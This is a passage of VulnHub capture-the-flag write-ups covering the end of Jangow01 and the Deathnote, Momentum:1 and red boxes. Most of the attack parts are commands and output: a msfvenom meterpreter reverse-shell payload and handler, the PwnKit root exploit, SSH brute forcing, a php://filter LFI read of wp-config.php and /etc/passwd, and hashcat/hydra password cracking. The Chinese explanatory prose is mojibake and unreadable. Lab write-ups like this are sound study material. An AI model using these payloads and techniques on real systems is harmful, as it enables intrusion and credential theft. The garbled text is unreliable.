åœ¨æœ¬æœº nc -l -p 4444 ç›‘å¬ç«¯å£ï¼Œé¶æœºè¿æ¥ nc 127.0.0.1 4444 ç«¯å£ï¼Œæ•°æ®è½¬å‘æˆåŠŸã€‚

```
jangow01@jangow01:~$ nc 127.0.0.1 4444
hello

root@localhost:~# nc -l -p 4444
hello
```



msfconsole ç”Ÿæˆ payload æ–‡ä»¶ï¼ˆLHOST 127.0.0.1 LPORT 4444ï¼‰ï¼Œä¸Šä¼ åˆ°é¶æœºã€‚

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o elf 

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: elf
```

![image-20250304181254293](./images/vulnhub.assets/image-20250304181254293.png)



msfconsole ç›‘å¬ç«¯å£

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

msf6 exploit(multi/handler) > run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
```



åœ¨é¶æœºä¸Šè®¾ç½® elf å¯æ‰§è¡Œæƒé™ï¼Œå¹¶æ‰§è¡Œã€‚

![image-20250304181740428](./images/vulnhub.assets/image-20250304181740428.png)



msfconsole æˆåŠŸä¸Šçº¿

```
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (3045380 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:40612) at 2025-03-04 10:16:55 +0000

meterpreter > sysinfo 
Computer     : 10.10.10.100
OS           : Ubuntu 16.04 (Linux 4.4.0-31-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```



ä½¿ç”¨ post/multi/recon/local_exploit_suggester æ‰«ææœ¬åœ°ææƒæ¼æ´

```
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 127.0.0.1 - Collecting local exploits for x64/linux...
[*] 127.0.0.1 - 203 exploit checks are being tried...
[+] 127.0.0.1 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 127.0.0.1 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/docker_cgroup_escape: The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
[+] 127.0.0.1 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/ntfs3g_priv_esc: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 127.0.0.1 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 127.0.0.1 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
[*] Running check method for exploit 73 / 73
[*] 127.0.0.1 - Valid modules for session 1:
============================

 #   Name                                                                Potentially Vulnerable?  Check Result
 -   ----                                                                -----------------------  ------------
 1   exploit/linux/local/bpf_sign_extension_priv_esc                     Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.
 4   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.4.0-31-generic is vulnerable
 6   exploit/linux/local/glibc_realpath_priv_esc                         Yes                      The target appears to be vulnerable.
 7   exploit/linux/local/ntfs3g_priv_esc                                 Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 9   exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.
 10  exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 11  exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.16.pre.0ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
...
```



é€ä¸ªå°è¯•æ‰«æåˆ°çš„æ¼æ´ï¼ŒæˆåŠŸæå‡æƒé™åˆ° root

```
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1 
SESSION => 1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST 127.0.0.1 
LHOST => 127.0.0.1

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 5555
LPORT => 5555

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run 
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.qhwyrca
[+] The target is vulnerable.
[*] Writing '/tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.wefuymefljbi
[*] Sending stage (3045380 bytes) to 127.0.0.1
[+] Deleted /tmp/.wefuymefljbi/kfqdwzcdv/kfqdwzcdv.so
[+] Deleted /tmp/.wefuymefljbi/.oniqfxz
[+] Deleted /tmp/.wefuymefljbi
[*] Meterpreter session 2 opened (127.0.0.1:5555 -> 127.0.0.1:54186) at 2025-03-04 10:22:28 +0000

meterpreter > shell
Process 4624 created.
Channel 1 created.
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```



## Deathnote

Nmap æ‰«æ IP

```
nmap -sP -PR -n -T 5 10.10.10.0/24

address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.101  00:0c:29:77:aa:a8        Linux               4.X    server
```



Nmap æ‰«æ TCP æœåŠ¡

```
db_nmap -sS -sV -n -p- -r -O -T 5 10.10.10.101

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.101  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.101  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



FFUF å·¥å…·ä½¿ç”¨é«˜é¢‘æ–‡ä»¶å­—å…¸è¿›è¡Œæ‰«æï¼Œå‘ç° robots.txt æ–‡ä»¶

```
ffuf -u http://10.10.10.101/FUZZ -w raft-large-files-lowercase.txt

robots.txt              [Status: 200, Size: 68, Words: 11, Lines: 5, Duration: 1ms]
```



è®¿é—® robots.txt é¡µé¢ï¼Œæç¤º /important.jpg è·¯å¾„

```
curl http://10.10.10.101/robots.txt
fuck it my dad 
added hint on /important.jpg

ryuk please delete it
```



è®¿é—® important.jpg é¡µé¢ï¼Œå…¶æ˜¯ä¸€ä¸ª ASCII æ–‡æœ¬æ–‡ä»¶

```
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself 
but i think it is in the hint section of site
```

æç¤ºç”¨æˆ·åå­˜æ”¾åœ¨ **user.txt** ä¸­



FFUF å·¥å…·ä½¿ç”¨ç›®å½•å­—å…¸è¿›è¡Œæ‰«æ

```
ffuf -u http://10.10.10.101/FUZZ -w raft-medium-directories-lowercase.txt

wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
```



è®¿é—® manual é¡µé¢ï¼Œè¿™æ˜¯ apache çš„æ–‡æ¡£ï¼Œæ— å†…å®¹ã€‚

è®¿é—® wordpress é¡µé¢ï¼Œå‘ç°è¯¥ç½‘ç«™æ˜¯ wordpress CMSï¼Œåç«¯æ˜¯ apache + phpã€‚

æ³¨ï¼šè¿™é‡Œå°† 10.10.10.101 å’ŒåŸŸå deathnote.vuln ç»‘å®šï¼Œé€šè¿‡åŸŸåè®¿é—®ç½‘ç«™ï¼Œå¦åˆ™ä¼šå‡ºç°é—®é¢˜ã€‚

![image-20250305095616725](./images/vulnhub.assets/image-20250305095616725.png)



æŸ¥çœ‹ç½‘é¡µå…ƒç´ å‘ç° upload è·¯å¾„

![image-20250305094305755](./images/vulnhub.assets/image-20250305094305755.png)



å°è¯•åœ¨é¶æœºä¸Šè®¿é—®è¯¥è·¯å¾„ï¼Œå‘ç°è¯¥è·¯å¾„å­˜åœ¨ï¼Œå¼€å¯äº† apache çš„ç›®å½•æµè§ˆæ¨¡å¼ï¼Œå­˜åœ¨ user.txt å’Œ notes.txt

![image-20250305095811866](./images/vulnhub.assets/image-20250305095811866.png)



æ ¹æ® user.txt å’Œ notes.txt çŒœæµ‹å¯èƒ½æ˜¯è´¦å·å’Œå¯†ç è¡¨ã€‚

```
user.txt

KIRA
L
ryuk
...
```

```
notes.txt

death4
death4life
death4u
...
```



å°è¯•è¿›è¡Œ ssh ç™»å½•

```
msf6 > use auxiliary/scanner/ssh/ssh_login 

msf6 auxiliary(scanner/ssh/ssh_login) > hosts -R 
RHOSTS => 10.10.10.101

msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE user.txt 
USER_FILE => user.txt

msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE notes.txt
PASS_FILE => notes.txt

msf6 auxiliary(scanner/ssh/ssh_login) > run 
[*] 10.10.10.101:22 - Starting bruteforce

[+] 10.10.10.101:22 - Success: 'l:death4me' 'uid=1000(l) gid=1000(l) groups=1000(l),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth) Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux '
[*] SSH session 1 opened (10.10.10.10:36185 -> 10.10.10.101:22) at 2025-03-05 02:12:59 +0000
uname -a 
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64 GNU/Linux
```



æŸ¥æ‰¾ä¸»æœºä¸Šçš„æ–‡ä»¶ï¼Œ/home/l/user.txt æ–‡ä»¶å†…å®¹ä¸º Brainfuck ç¼–ç 

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

```
i think u got the shell , but you wont be able to kill me -kira
```



æ–‡ä»¶ /opt/L/fake-notebook-rule/case.wav å†…å®¹ä¸º 16 è¿›åˆ¶

```
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```



æ–‡ä»¶ /opt/L/fake-notebook-rule/hint æç¤ºä½¿ç”¨ cyberchef è¿›è¡Œè§£ç 

```
use cyberchef
```



ä½¿ç”¨ cyberchef çš„é­”æ³•åŠŸèƒ½è¿›è¡Œç¼–ç è¯†åˆ«ï¼Œå¯†ç ä¸º **kiraisevil**

![image-20250305125832566](./images/vulnhub.assets/image-20250305125832566.png)

![image-20250305125843254](./images/vulnhub.assets/image-20250305125843254-1741150724551-5.png)



åˆ‡æ¢åˆ° kira ç”¨æˆ·ï¼Œç™»å½•æˆåŠŸ

```
l@deathnote:/etc/apache2$ su kira
Password: 
kira@deathnote:/etc/apache2$ 
```



æŸ¥çœ‹ kira ç”¨æˆ·çš„ sudo æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤

```
kira@deathnote:/etc/apache2$ sudo -l 
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```



ä¿®æ”¹ root ç”¨æˆ·å¯†ç 

```
kira@deathnote:/etc/apache2$ sudo passwd root
New password: 
Retype new password: 
passwd: password updated successfully
```



åˆ‡æ¢åˆ° root ç”¨æˆ·

```
kira@deathnote:/etc/apache2$ su root
Password: 
root@deathnote:/etc/apache2# 
```



## Momentumï¼š1

Nmap æ‰«æç«¯å£

```
db_nmap -sS -sV -p- -r -n -O -T 5 10.10.10.102
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.102  22    tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0
10.10.10.102  80    tcp    http  open   Apache httpd 2.4.38 (Debian)
```



é€šè¿‡æµè§ˆå™¨è®¿é—®ç½‘ç«™ï¼Œä½¿ç”¨ Wappalyzer è¯†åˆ«ç½‘ç«™ä½¿ç”¨äº† PHP è¯­è¨€ã€‚

åœ¨æµè§ˆå™¨ä¸­è¿›è¡Œç®€å•äº¤äº’ï¼Œå‘ç°å…¶æ¶‰åŠåˆ°æ•°æ®åº“æŸ¥è¯¢ï¼Œä½†æ˜¯æ­¤å¤„æ—  SQL æ³¨å…¥ã€‚

![image-20250306154124850](./images/vulnhub.assets/image-20250306154124850.png)





ä½¿ç”¨ FFUF å·¥å…·çˆ†ç ´ç½‘ç«™ URL

```
ffuf -u http://10.10.10.102/FUZZ -w raft-large-directories-lowercase.txt
```

```
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 247ms]
img                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 986ms]
:: Progress: [56162/56162] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```



ç»è¿‡æ‰‹å·¥æ£€æŸ¥ manualã€css å’Œ img è·¯å¾„æ­£å¸¸ï¼Œjs è·¯å¾„ä¸‹å­˜åœ¨ main.js æ–‡ä»¶ã€‚

```
curl http://10.10.10.102/js/main.js
```

```
function viewDetails(str) {

  window.location.href = "opus-details.php?id="+str;
}

/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
```



è¯¥ä»£ç å±äºå…¸å‹çš„AES-CBCæ¨¡å¼è§£å¯†å®ç°ï¼Œé€‚ç”¨äºè§£å¯†é€šè¿‡CryptoJSé»˜è®¤é…ç½®åŠ å¯†çš„æ•°æ®ï¼Œè¿™é‡Œè®¾ç½®äº†å¯†ç ä¸º`SecretPassphraseMomentum` ã€‚

åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°ç½‘ç«™ä¸‹å‘äº†ä¸€ä¸ª cookieï¼Œå°è¯•ä½¿ç”¨æ”¹å¯†ç è¿›è¡Œè§£å¯†ï¼Œè§£å¯†åçš„ç»“æœä¸ºï¼š`auxerre-alienum##` ã€‚

![image-20250306155006262](./images/vulnhub.assets/image-20250306155006262.png)

![image-20250306155028985](./images/vulnhub.assets/image-20250306155028985.png)

è§£å¯†ç½‘ç«™ï¼šhttps://stackblitz.com/edit/cryptojs-aes-encrypt-decrypt?file=index.js



ä½¿ç”¨ node è¿›è¡Œè§£å¯†

```
npm install crypto-js

added 1 package in 2s
```

```
node 

Welcome to Node.js v20.14.0.
Type ".help" for more information.
> var CryptoJS = require("crypto-js");
undefined

> encrypted = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt"
'U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt'

> var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
undefined

> console.log(decrypted.toString(CryptoJS.enc.Utf8));
auxerre-alienum##
undefined
```



å°è¯•ä½¿ç”¨çº¿ç´¢ **auxerre-alienum##** é€šè¿‡ ssh è¿›è¡Œç™»å½•ï¼Œæµ‹è¯•å‘ç°ç”¨æˆ·åä¸º **auxerre** ï¼Œå¯†ç ä¸º**åŸå§‹å­—ç¬¦ä¸²ï¼ˆauxerre-alienum##ï¼‰**ã€‚

æŸ¥çœ‹è¿›ç¨‹å‘ç°ä»¥ root ç”¨æˆ·è¿è¡Œ redis è¿›ç¨‹ã€‚

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
redis      519  0.1  0.5  57304 12020 ?        Ssl  02:40   0:31 /usr/bin/redis-server 127.0.0.1:6379
```



ç»è¿‡è¿›ä¸€æ­¥ç ”ç©¶ï¼Œå¯ä»¥è¿æ¥åˆ°å®ƒå¹¶æŸ¥çœ‹å…¶å†…å®¹ï¼Œç»æµ‹è¯•ï¼Œè¯¥å¯†ç ä¸º root å¯†ç ã€‚

![image-20250306160617837](./images/vulnhub.assets/image-20250306160617837.png)



## red

è¯¥é¶æœºå·²ç»è¢«æ”»å‡»è€…å…¥ä¾µï¼Œå¹¶ç•™ä¸‹äº†åé—¨ï¼Œéœ€è¦æ‰¾å‡ºæ”»å‡»è€…ç•™ä¸‹çš„åé—¨ï¼Œå¹¶åˆ©ç”¨è¯¥æ¼æ´ä¸€æ­¥ä¸€æ­¥è·å– root æƒé™ã€‚



ç«¯å£å‘ç°

```
db_nmap -sS -sV -p- -r -n -T 5 -O 10.10.10.103
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.103  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.10.103  80    tcp    http  open   Apache httpd 2.4.41 (Ubuntu)
```



apache ç«¯å£ 80 æ„å‘³ç€æœ‰ä¸€ä¸ªç½‘é¡µï¼Œæ‰€ä»¥è½¬åˆ°æµè§ˆå™¨å¹¶è¾“å…¥ç›®æ ‡ ip åœ°å€æ¥è®¿é—®è¯¥ç½‘é¡µã€‚

![img](./images/vulnhub.assets/1Ahon-fRZUiZIAn7pintPiA.png)



æ£€æŸ¥ç½‘ç«™åï¼Œç¡®å®šè¿™æ˜¯ä¸€ä¸ª WordPress ç½‘ç«™ï¼Œä½†æ— æ³•æ­£å¸¸åŠ è½½ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†åŸŸåå’Œä¸»æœºçš„æ˜ å°„æ·»åŠ åˆ° hosts æ–‡ä»¶ä¸­ã€‚

```
10.10.10.103    redrocks.win
```



ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ° Red å‘æˆ‘ä»¬å‘å‡ºçš„è­¦å‘Šä¿¡æ¯ï¼ŒæŒ‡å‡ºæˆ‘ä»¬çš„ç½‘ç«™å·²è¢«é»‘å®¢å…¥ä¾µã€‚Red è¿˜ä¸ºæˆ‘ä»¬æä¾›äº†æœ‰å…³åé—¨çš„çº¿ç´¢ã€‚

![img](./images/vulnhub.assets/121y4gXlIs5d1-L_H4V8v5w.png)



ä½¿ç”¨ FFUF å¯¹ä¸€äº›è·¯å¾„è¿›è¡Œæš´åŠ›ç ´è§£

```
ffuf -u http://redrocks.win/FUZZ -w CommonBackdoors-PHP.fuzz.txt
```

```
NetworkFileManagerPHP.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 2770ms]
```



ç›´æ¥è®¿é—®è¿™ä¸ªè·¯å¾„ï¼Œå¹¶æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹

```
curl -i http://redrocks.win/NetworkFileManagerPHP.php 

HTTP/1.0 500 Internal Server Error
Date: Sat, 08 Mar 2025 15:06:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```



å®ƒæ˜¯ä¸€ä¸ª webshellåé—¨ã€‚ä½†æ ¹æ®æˆ‘ä»¬çš„æç¤ºï¼Œæˆ‘ä»¬çŸ¥é“ Red æ­£åœ¨å°†å…¶ç”¨ä½œæŸç§ç±»å‹çš„ LFI åé—¨ã€‚

LFIï¼ˆLocal File Inclusionï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰åé—¨æ˜¯ä¸€ç§åˆ©ç”¨Webåº”ç”¨ç¨‹åºä¸­çš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆLFIï¼‰æ¥æ¤å…¥æˆ–ç»´æŒæŒä¹…æ€§è®¿é—®æƒé™çš„æ¶æ„æŠ€æœ¯ã€‚

LFI åé—¨ï¼Œå¯é€šè¿‡URLå‚æ•°ï¼ˆå¦‚`?page=about.php`ï¼‰æ“æ§æ–‡ä»¶åŒ…å«è·¯å¾„ã€‚å°è¯•ä½¿ç”¨ LFI å‚æ•°å­—å…¸å°è¯•çˆ†ç ´è¿™ä¸ªåé—¨çš„å‚æ•°ã€‚

```
ffuf -u http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test -w lfi-fuzz-params-list.txt -mc 200
```

```
key                     [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 4888ms]
```



LFI åé—¨çš„å‚æ•°æ˜¯ keyï¼Œä½¿ç”¨æ¼æ´è¯»å–æ–‡ä»¶ï¼Œå‘ç°å¯ç™»å½•çš„ç”¨æˆ·ä¸º rootã€johnã€ippsec å’Œ oxdf ç­‰ã€‚

```
curl http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd | grep /bin/bash
```

```
root:x:0:0:root:/root:/bin/bash	
john:x:1000:1000:john:/home/john:/bin/bash
ippsec:x:1001:1001:,,,:/home/ippsec:/bin/bash
oxdf:x:1002:1002:,,,:/home/oxdf:/bin/bash
```



è¯»å– wp-config.php æ–‡ä»¶ï¼Œè·å–æ•°æ®åº“çš„è´¦å·å’Œå¯†ç ã€‚

```
curl -i http://redrocks.win/NetworkFileManagerPHP.php?key=wp-config.php 

HTTP/1.1 200 OK
Date: Sat, 08 Mar 2025 15:38:44 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 1
Content-Type: text/html; charset=UTF-8
```

æœåŠ¡å™¨è¿”å› HTTP 200 Codeï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•å†…å®¹ï¼Œå› ä¸º wp-config.php æ–‡ä»¶å†…å®¹ä¸º `<?php ... ?>` ï¼ŒPHP ä¼šå°è¯•è§£æå’Œæ‰§è¡Œè¿™äº›ä»£ç ï¼Œè€Œä¸æ˜¯ç›´æ¥ä»¥æ–‡æœ¬å½¢å¼è¿”å›ã€‚



æ­¤å¤„å¯ä»¥ä½¿ç”¨ php ä¼ªåè®®ï¼Œåœ¨è¯»å–æ–‡ä»¶å†…å®¹æ—¶è¿›è¡Œ base64 ç¼–ç ï¼Œæ­¤æ—¶ PHP å°±æ— æ³•è§£æå’Œæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›æ–‡æœ¬ã€‚

```
curl -i http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php
HTTP/1.1 200 OK
Date: Sat, 08 Mar 2025 15:42:22 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 4529
Content-Type: text/html; charset=UTF-8

PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb...
```



åœ¨ä½¿ç”¨ curl ä¸ä½¿ç”¨ -i å‚æ•°ï¼Œå¹¶å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°  /dev/nullï¼Œå°†è¿”å›çš„å†…å®¹é€šè¿‡ç®¡é“ä¼ è¾“ç»™ base64 è¿›è¡Œè§£ç 

```
curl http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=wp-config.php 2> /dev/null | base64 -d
```

```
<? ...

/** MySQL database username */
define( 'DB_USER', 'john' );

/** MySQL database password */
define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );

... ?>
```

- ç”¨æˆ·ï¼š**john**
- å¯†ç ï¼š**R3v_m4lwh3r3_k1nG!!**



æ•°æ®åº“ç”¨æˆ·åå’Œç³»ç»Ÿç”¨æˆ·åç›¸åŒï¼Œå°è¯•ä½¿ç”¨è¯¥ç”¨æˆ·åå’Œå¯†ç é€šè¿‡ SSH ç™»å½•ç³»ç»Ÿï¼Œç™»å½•å¤±è´¥ã€‚

è¯»å–LFI åé—¨æ–‡ä»¶ NetworkFileManagerPHP.php æ–‡ä»¶è·å–æ›´å¤šä¿¡æ¯ã€‚

```
curl  http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php 2> /dev/null | base64 -d
```

```
<?php
   $file = $_GET['key'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("NetworkFileManagerPHP.php");
   }
   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
?>
```



LFI åé—¨æ–‡ä»¶ä¸­æœ‰ä¸€æ®µç»è¿‡ base64 ç¼–ç çš„æ³¨é‡Šï¼Œè§£ç åçš„å†…å®¹å¦‚ä¸‹ï¼š

```
That password alone won't help you! Hashcat says rules are rules
```

**That password alone won't help you!**â€ æŒ‡ä»…å‡­ä¸€ä¸ªåŸå§‹å¯†ç ï¼ˆå¦‚ä»æ³„éœ²æ•°æ®ä¸­è·å–çš„æ˜æ–‡å¯†ç ï¼‰ä¸è¶³ä»¥ç ´è§£ç›®æ ‡ç³»ç»Ÿï¼Œå¯†ç å¯èƒ½ç»è¿‡å˜å½¢ã€‚

â€œ**Hashcat says rules are rules**â€ å¼ºè°ƒå¿…é¡»ä½¿ç”¨ Hashcat çš„è§„åˆ™é›†æ¥æ‰©å±•å¯†ç çš„å¯èƒ½æ€§ï¼Œå¦åˆ™æ— æ³•æˆåŠŸç ´è§£ã€‚è¿™é‡Œçš„ç¬¬ä¸€ä¸ªâ€œrulesâ€æŒ‡æŠ€æœ¯è§„åˆ™ï¼ˆå¯†ç å˜å½¢è§„åˆ™ï¼‰ï¼Œç¬¬äºŒä¸ªâ€œrulesâ€å€Ÿç”¨è‹±æ–‡è°šè¯­â€œè§„åˆ™å°±æ˜¯è§„åˆ™â€ï¼Œæš—ç¤ºå¿…é¡»éµå®ˆå®¢è§‚è§„å¾‹ã€‚



åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå‘½åä¸º pass.txtï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚

```
R3v_m4lwh3r3_k1nG!!
```

ä½¿ç”¨ hashcat ä¸­çš„ best64.rule è§„åˆ™å¯¹å¯†ç è¿›è¡Œå˜å½¢ã€‚

```
hashcat --force pass.txt -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt
```

```
R3v_m4lwh3r3_k1nG!!
!!Gn1k_3r3hwl4m_v3R
R3V_M4LWH3R3_K1NG!!
r3v_m4lwh3r3_k1nG!!
R3v_m4lwh3r3_k1nG!!0
...
```



é€šè¿‡ Hydra ä½¿ç”¨å˜å½¢çš„ wordlist.txt å¯†ç å­—å…¸ï¼Œå¯¹ john ç”¨æˆ·çš„å¯†ç è¿›è¡Œçˆ†ç ´ã€‚

```
hydra -l john -P wordlist.txt 10.10.10.103 ssh
```

```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.10.103:22/
[22][ssh] host: 10.10.10.103   login: john   password: r3v_m4lwh3r3_k1nG!!
1 of 1 target successfully completed, 1 valid password found
```



ç°åœ¨å¯ä»¥é€šè¿‡ SSH è¿›å…¥æœåŠ¡å™¨ï¼Œred è®¾ç½®äº†é˜²å¾¡æœºåˆ¶ï¼Œ5 åˆ†é’Ÿåå°†æˆ‘ä»¬æ³¨é”€å¹¶æ›´æ”¹å¯†ç ã€‚

```
Last login: Sat Mar  8 16:51:07 2025 from 10.10.10.10
john@red:~$ Red Rules, Blue Drools!
You will never win Blue
Say Bye Bye to your Shell Blue and that password
Connection to 10.10.10.103 closed by remote host.
Connection to 10.10.10.103 closed.
```



